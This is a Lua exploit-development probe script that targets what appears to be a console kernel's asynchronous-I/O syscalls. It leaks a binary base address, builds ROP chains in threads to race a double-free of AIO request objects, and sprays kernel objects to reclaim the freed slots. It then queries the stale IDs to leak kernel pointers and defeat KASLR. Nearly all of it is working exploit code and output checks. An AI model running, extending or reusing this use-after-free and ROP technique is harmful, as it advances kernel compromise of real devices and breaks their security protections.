-- CRASH_CLASS: HIGH
-- PROBE 69p: AIO readback after double-free — test if 663/666/667 leak data
--
-- After double-free, one R copy stays on the free list. If we spray
-- (evf/namedobj) and reclaim that slot, then query the ORIGINAL AIO ID
-- through 663(wait)/666(get_status)/667(get_error), the stale reference
-- may traverse into the spray object and leak spray data OR kernel ptrs.
--
-- Alternatively, if another AIO submit reclaims the slot, the new R's
-- kernel thread pointers at R+0x00/R+0x08 may leak through the query.
--
-- 670 must NEVER be called — it permanently poisons the 662 delete path.
-- 664 poll MUST precede any 662 delete.

print("=== PROBE 69p: AIO READBACK AFTER UAF ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then return true end
    return false
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42

-- Ignore SIGSYS, SIGSEGV, SIGBUS
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

-- Open /dev/zero for AIO reads
local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)

local data_buf = memory.alloc(0x1000)
local reqs = memory.alloc(0x30)

-- AIO helpers
local function aio_submit(fd)
    local id_out = memory.alloc(8)
    wd(N(id_out), 0)
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    wq(N(reqs) + 0x10, uint64(N(data_buf)))
    wq(N(reqs) + 0x18, uint64(N(memory.alloc(8))))
    wd(N(reqs) + 0x20, fd); wd(N(reqs) + 0x24, 0)
    pcall(function() mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(id_out))) end)
    return rd(N(id_out)) or 0
end

local function aio_poll(id)
    local one_id = memory.alloc(8); wd(N(one_id), id)
    local one_st = memory.alloc(8); wd(N(one_st), 0xDEAD)
    pcall(function() mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or 0xDEAD
end

local function build_delete_child(del_ids_addr, count, states_addr)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi); emit(uint64(del_ids_addr))
    emit(g_pop_rsi); emit(uint64(count))
    emit(g_pop_rdx); emit(uint64(states_addr))
    emit(g_pop_rax); emit(uint64(662))
    emit(stub)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(N(par) + 0x30, tid)
    return par
end

-- ============================================================
-- [A] Baseline: normal AIO query output
-- ============================================================
print("[A] Baseline AIO query semantics")

for trial = 1, 4 do
    if not alive() then break end
    local id = aio_submit(fd_zero)
    if id == 0 then print("  submit failed"); break end
    aio_poll(id)

    local buf_663 = memory.alloc(64)
    local buf_666 = memory.alloc(64)
    local buf_667 = memory.alloc(64)
    for j = 0, 60, 4 do wd(N(buf_663) + j, 0xAAAAAAAA) end
    for j = 0, 60, 4 do wd(N(buf_666) + j, 0xBBBBBBBB) end
    for j = 0, 60, 4 do wd(N(buf_667) + j, 0xCCCCCCCC) end

    local r663, r666, r667 = -999, -999, -999
    pcall(function() r663 = sgn(mk(663)(uint64(N(buf_663)), uint64(1), uint64(N(buf_663) + 4))) end)
    pcall(function() r666 = sgn(mk(666)(uint64(N(buf_666)), uint64(1), uint64(N(buf_666) + 4))) end)
    pcall(function() r667 = sgn(mk(667)(uint64(N(buf_667)), uint64(1), uint64(N(buf_667) + 4))) end)

    -- Wait, 663/666/667 take (ids, count, states) like 662/664.
    -- Let me use the correct layout:
    local ids_buf = memory.alloc(8); wd(N(ids_buf), id)
    local st_663 = memory.alloc(64); for j = 0, 60, 4 do wd(N(st_663) + j, 0xAAAAAAAA) end
    local st_666 = memory.alloc(64); for j = 0, 60, 4 do wd(N(st_666) + j, 0xBBBBBBBB) end
    local st_667 = memory.alloc(64); for j = 0, 60, 4 do wd(N(st_667) + j, 0xCCCCCCCC) end

    r663, r666, r667 = -999, -999, -999
    pcall(function() r663 = sgn(mk(663)(uint64(N(ids_buf)), uint64(1), uint64(N(st_663)))) end)
    pcall(function() r666 = sgn(mk(666)(uint64(N(ids_buf)), uint64(1), uint64(N(st_666)))) end)
    pcall(function() r667 = sgn(mk(667)(uint64(N(ids_buf)), uint64(1), uint64(N(st_667)))) end)

    print(string.format("  id=0x%X: 663 ret=%d 666 ret=%d 667 ret=%d", id, r663, r666, r667))

    -- Scan states for modified bytes
    local function scan_buf(buf, sentinel, label)
        local modified = {}
        for j = 0, 60, 4 do
            local v = rd(N(buf) + j) or sentinel
            if v ~= sentinel then
                table.insert(modified, string.format("+%02X=0x%08X", j, v))
            end
        end
        if #modified > 0 then
            print("    " .. label .. " modified: " .. table.concat(modified, " "))
        end
    end
    scan_buf(st_663, 0xAAAAAAAA, "663")
    scan_buf(st_666, 0xBBBBBBBB, "666")
    scan_buf(st_667, 0xCCCCCCCC, "667")

    -- Clean up
    local del_ids = memory.alloc(8); wd(N(del_ids), id)
    local del_st = memory.alloc(8); wd(N(del_st), 0xDEAD)
    pcall(function() mk(662)(uint64(N(del_ids)), uint64(1), uint64(N(del_st))) end)
end

if not alive() then print("DEAD after [A]"); return end

-- ============================================================
-- [B] Double-free + EVF spray + query original IDs
-- ============================================================
print("")
print("[B] Double-free + EVF spray + AIO query")

local BATCH = 16
local del_ids = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)
local kptrs_found = 0

local b_done = false
for attempt = 1, 8 do
    if b_done or not alive() then break end
    repeat
        -- Submit & poll
        local ids = {}
        for i = 1, BATCH do
            local id = aio_submit(fd_zero)
            if id ~= 0 then aio_poll(id); table.insert(ids, id) end
        end
        if #ids < 8 then print("  Only " .. #ids .. " IDs"); b_done = true; break end

        for i = 0, #ids - 1 do
            wd(N(del_ids) + i * 4, ids[i + 1])
            wd(N(states_A) + i * 4, 0xAAAAAAAA)
            wd(N(states_B) + i * 4, 0xBBBBBBBB)
        end

        local par_A = build_delete_child(N(del_ids), #ids, N(states_A))
        local par_B = build_delete_child(N(del_ids), #ids, N(states_B))
        pcall(function() mk(455)(par_A, uint64(0x38)) end)
        pcall(function() mk(455)(par_B, uint64(0x38)) end)
        for w = 1, 50000 do local _ = rd(N(del_ids)) end

        local doubles = 0
        local double_ids = {}
        for i = 0, #ids - 1 do
            local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
            local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
            if sA == 0 and sB == 0 then
                doubles = doubles + 1
                table.insert(double_ids, ids[i + 1])
            end
        end

        if not alive() then
            print(string.format("  attempt %d: CRASHED (doubles=%d)", attempt, doubles))
            b_done = true; break
        end

        if doubles == 0 then
            if attempt <= 3 then print(string.format("  attempt %d: no doubles", attempt)) end
            break -- next attempt
        end

        print(string.format("  attempt %d: %d doubles! IDs:", attempt, doubles))
        for _, did in ipairs(double_ids) do
            print(string.format("    0x%X", did))
        end

        -- EVF spray: create 200 objects
        local evf_handles = {}
        for i = 1, 200 do
            local name = put_str(string.format("e%04d", i))
            local h = nil
            pcall(function() h = mk(538)(uint64(N(name)), uint64(0xCAFE0000 + i)) end)
            if h then
                local hv = N(h)
                if hv > 0 and hv ~= 0xFFFFFFFF then table.insert(evf_handles, hv) end
            end
        end
        print(string.format("    sprayed %d evf objects", #evf_handles))

        -- Query original double-freed IDs through AIO interfaces
        for _, did in ipairs(double_ids) do
            local ids_buf = memory.alloc(8); wd(N(ids_buf), did)
            local st = memory.alloc(64)
            for j = 0, 60, 4 do wd(N(st) + j, 0xDDDDDDDD) end

            pcall(function() mk(663)(uint64(N(ids_buf)), uint64(1), uint64(N(st))) end)
            if not alive() then print("    CRASHED on 663"); break end

            for j = 0, 56, 8 do
                local v = rq(N(st) + j)
                if v and is_kptr(v) then
                    local h, l = get_hi_lo(v)
                    print(string.format("    *** KPTR via 663 id=0x%X +%02X: 0x%08X%08X ***",
                        did, j, h, l))
                    kptrs_found = kptrs_found + 1
                end
            end

            for j = 0, 60, 4 do wd(N(st) + j, 0xEEEEEEEE) end
            pcall(function() mk(666)(uint64(N(ids_buf)), uint64(1), uint64(N(st))) end)
            if not alive() then print("    CRASHED on 666"); break end

            for j = 0, 56, 8 do
                local v = rq(N(st) + j)
                if v and is_kptr(v) then
                    local h, l = get_hi_lo(v)
                    print(string.format("    *** KPTR via 666 id=0x%X +%02X: 0x%08X%08X ***",
                        did, j, h, l))
                    kptrs_found = kptrs_found + 1
                end
            end

            for j = 0, 60, 4 do wd(N(st) + j, 0) end
            pcall(function() mk(667)(uint64(N(ids_buf)), uint64(1), uint64(N(st))) end)
            if not alive() then print("    CRASHED on 667"); break end

            local modified_667 = false
            for j = 0, 56, 4 do
                local v = rd(N(st) + j) or 0
                if v ~= 0 then modified_667 = true end
            end
            if modified_667 then
                print(string.format("    667 modified output for id=0x%X!", did))
            end
        end

        -- Scan evf readback for contamination
        for idx, eh in ipairs(evf_handles) do
            local rv = nil
            pcall(function() rv = mk(543)(uint64(eh), uint64(0xFFFFFFFF), uint64(0x10)) end)
            if rv and is_kptr(rv) then
                local h, l = get_hi_lo(rv)
                print(string.format("    *** KPTR via evf 543 handle=0x%X: 0x%08X%08X ***", eh, h, l))
                kptrs_found = kptrs_found + 1
            end
            if idx > 50 then break end
        end

        for _, eh in ipairs(evf_handles) do
            pcall(function() mk(539)(uint64(eh)) end)
        end

        b_done = true
    until true
end

if not alive() then print("DEAD after [B]"); return end

-- ============================================================
-- [C] Double-free + AIO re-submit + query stale IDs
-- ============================================================
print("")
print("[C] Double-free + re-submit + query stale IDs")

local c_done = false
for attempt = 1, 8 do
    if c_done or not alive() then break end
    repeat
        local ids = {}
        for i = 1, BATCH do
            local id = aio_submit(fd_zero)
            if id ~= 0 then aio_poll(id); table.insert(ids, id) end
        end
        if #ids < 8 then c_done = true; break end

        for i = 0, #ids - 1 do
            wd(N(del_ids) + i * 4, ids[i + 1])
            wd(N(states_A) + i * 4, 0xAAAAAAAA)
            wd(N(states_B) + i * 4, 0xBBBBBBBB)
        end

        local par_A = build_delete_child(N(del_ids), #ids, N(states_A))
        local par_B = build_delete_child(N(del_ids), #ids, N(states_B))
        pcall(function() mk(455)(par_A, uint64(0x38)) end)
        pcall(function() mk(455)(par_B, uint64(0x38)) end)
        for w = 1, 50000 do local _ = rd(N(del_ids)) end

        local doubles = 0
        local double_ids = {}
        for i = 0, #ids - 1 do
            local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
            local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
            if sA == 0 and sB == 0 then
                doubles = doubles + 1
                table.insert(double_ids, ids[i + 1])
            end
        end

        if not alive() then c_done = true; break end
        if doubles == 0 then
            if attempt <= 3 then print(string.format("  attempt %d: no doubles", attempt)) end
            break
        end

        print(string.format("  attempt %d: %d doubles", attempt, doubles))

        local new_ids = {}
        for i = 1, 32 do
            local nid = aio_submit(fd_zero)
            if nid ~= 0 then table.insert(new_ids, nid) end
        end
        print(string.format("    re-submitted %d new AIO jobs", #new_ids))

        for _, did in ipairs(double_ids) do
            local ids_buf = memory.alloc(8); wd(N(ids_buf), did)
            local st = memory.alloc(64)
            for j = 0, 60, 4 do wd(N(st) + j, 0xAAAAAAAA) end

            pcall(function() mk(663)(uint64(N(ids_buf)), uint64(1), uint64(N(st))) end)
            if not alive() then break end

            for j = 0, 56, 8 do
                local v = rq(N(st) + j)
                if v and is_kptr(v) then
                    local h, l = get_hi_lo(v)
                    print(string.format("    *** KPTR via 663 id=0x%X +%02X: 0x%08X%08X ***",
                        did, j, h, l))
                    kptrs_found = kptrs_found + 1
                end
            end

            local st0 = rd(N(st)) or 0xAAAAAAAA
            if st0 ~= 0xAAAAAAAA and st0 ~= 0 and st0 ~= 0x80020003 then
                print(string.format("    UNUSUAL 663 state for id=0x%X: 0x%08X", did, st0))
            end
        end

        for _, nid in ipairs(new_ids) do
            aio_poll(nid)
            local d_ids = memory.alloc(8); wd(N(d_ids), nid)
            local d_st = memory.alloc(8); wd(N(d_st), 0xDEAD)
            pcall(function() mk(662)(uint64(N(d_ids)), uint64(1), uint64(N(d_st))) end)
        end

        c_done = true
    until true
end

if not alive() then print("DEAD after [C]"); return end

-- ============================================================
-- [D] Large buffer query — hexdump 663/666/667 output
-- ============================================================
print("")
print("[D] Large buffer hexdump of AIO queries on double-freed IDs")

local d_done = false
for attempt = 1, 8 do
    if d_done or not alive() then break end
    repeat
        local ids = {}
        for i = 1, BATCH do
            local id = aio_submit(fd_zero)
            if id ~= 0 then aio_poll(id); table.insert(ids, id) end
        end
        if #ids < 8 then d_done = true; break end

        for i = 0, #ids - 1 do
            wd(N(del_ids) + i * 4, ids[i + 1])
            wd(N(states_A) + i * 4, 0xAAAAAAAA)
            wd(N(states_B) + i * 4, 0xBBBBBBBB)
        end

        local par_A = build_delete_child(N(del_ids), #ids, N(states_A))
        local par_B = build_delete_child(N(del_ids), #ids, N(states_B))
        pcall(function() mk(455)(par_A, uint64(0x38)) end)
        pcall(function() mk(455)(par_B, uint64(0x38)) end)
        for w = 1, 50000 do local _ = rd(N(del_ids)) end

        local doubles = 0
        local double_ids = {}
        for i = 0, #ids - 1 do
            local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
            local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
            if sA == 0 and sB == 0 then
                doubles = doubles + 1
                table.insert(double_ids, ids[i + 1])
            end
        end

        if not alive() then d_done = true; break end
        if doubles == 0 then break end

        print(string.format("  attempt %d: %d doubles — hexdumping queries", attempt, doubles))

        for qi, did in ipairs(double_ids) do
            if qi > 3 then break end
            local ids_buf = memory.alloc(8); wd(N(ids_buf), did)

            local big = memory.alloc(256)
            for j = 0, 252, 4 do wd(N(big) + j, 0) end

            local ret663 = -999
            pcall(function() ret663 = sgn(mk(663)(uint64(N(ids_buf)), uint64(1), uint64(N(big)))) end)
            if not alive() then print("    CRASHED on 663 hexdump"); break end

            print(string.format("  id=0x%X 663 ret=%d:", did, ret663))
            local line = ""
            for j = 0, 60, 4 do
                local v = rd(N(big) + j) or 0
                line = line .. string.format("%08X ", v)
                if (j + 4) % 32 == 0 then
                    print("    " .. line)
                    line = ""
                end
            end
            if #line > 0 then print("    " .. line) end

            for j = 0, 56, 8 do
                local v = rq(N(big) + j)
                if v and is_kptr(v) then
                    local h, l = get_hi_lo(v)
                    print(string.format("    *** KPTR at +%02X: 0x%08X%08X ***", j, h, l))
                    kptrs_found = kptrs_found + 1
                end
            end
        end

        d_done = true
    until true
end

print("")
print(string.format("TOTAL KERNEL POINTERS FOUND: %d", kptrs_found))
if kptrs_found > 0 then
    print("*** KASLR DEFEAT PATH IDENTIFIED ***")
else
    print("No kernel pointers through AIO query interfaces")
    print("(663/666/667 may only return status dwords, not object contents)")
end

print("")
print("=== PROBE 69p COMPLETE ===")
